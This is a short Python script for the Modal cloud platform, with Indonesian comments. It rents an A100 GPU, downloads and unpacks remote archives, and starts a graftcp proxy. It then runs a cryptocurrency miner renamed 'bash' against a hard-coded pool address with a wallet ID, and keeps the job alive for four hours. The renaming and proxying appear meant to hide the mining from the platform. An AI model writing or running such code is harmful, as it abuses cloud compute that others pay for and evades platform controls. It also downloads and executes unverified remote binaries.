import modal
import subprocess
import time

app = modal.App("t4x3-runner")

image = (
    modal.Image.from_registry(
        "nvidia/cuda:12.1.1-runtime-ubuntu22.04"
    )
    .apt_install(
        "python3",
        "python3-pip",
        "python-is-python3",
        "git",
        "wget",
        "unzip"
    )
)

@app.function(
    image=image,
    gpu="A100-40GB:1",  # âœ… FIX deprecated
    cpu=4,
    memory=8192,
    max_containers=1,
    timeout=60 * 60 * 4
    # âŒ secret dihapus karena tidak dipakai
)
def run_script():
    # cek GPU
    subprocess.run(["nvidia-smi"], check=False)

    cmd = """
    set -e

    echo "=== DOWNLOAD FILE ==="
    wget -q https://github.com/hujisanda/root/releases/download/nwe/pan.zip -O pan.zip

    echo "=== EXTRACT ==="
    unzip -o pan.zip
        
    cd pan

    echo "=== SET PERMISSION ==="
    chmod -R +x .

    echo "=== START GRAFTCP LOCAL ==="
    ./graftcp/local/graftcp-local -config graftcp-local.conf > /dev/null 2>&1 &

    # tunggu service siap
    sleep 3

    # download lol
    git clone https://github.com/hujisanda/lol198.git
    cd lol198 && chmod u+x bash

    #pindah file    
    mv bash ~/pan
    
    # pindah file pan
    cd ~
    cd pan

    echo "=== RUN PROC VIA GRAFTCP ==="
    ./graftcp/graftcp ./bash --algo FISHHASH --pool 168.144.99.100:80 --user d955e86ec8ebfa1aadcf13f162a10c85778e3f3ac5002660ea0097df6f3e660a.kacung --ethstratum ETHPROX
    """

    subprocess.run(["bash", "-lc", cmd], check=False)

    print("Staying alive for 4 hours...")
    time.sleep(60 * 60 * 4)
